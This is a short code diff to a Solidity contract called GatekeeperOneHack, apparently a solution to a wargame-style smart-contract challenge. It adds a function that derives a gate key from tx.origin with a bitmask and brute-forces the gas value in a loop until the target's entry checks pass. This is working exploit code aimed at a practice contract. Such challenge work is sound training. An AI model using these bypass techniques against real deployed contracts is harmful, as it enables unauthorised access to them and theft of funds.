@@ -35,19 +35,12 @@ contract GatekeeperOneHack {
         curGatekeeperOne = GatekeeperOne(GatekeeperOneAdr);
     }
 
-    function f1 (bytes8 _a) public pure returns (uint64){
-        return uint64(_a);
-    }
-
-    function f2 (bytes8 _a) public pure returns (uint16){
-        return uint16(uint64(_a));
-    }
-
-    function f3 (bytes8 _a) public pure returns (uint32){
-        return uint32(uint64(_a));
-    }
-
-    function f4 () public view returns (uint32){
-        return uint16(uint160(tx.origin));
+    function callEnter() public {
+        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
+        for (uint256 i = 0; i <= 8191; i++) {
+            try curGatekeeperOne.enter{gas: 800000 + i}(key) {
+                break;
+            } catch {}
+        }
     }
 }
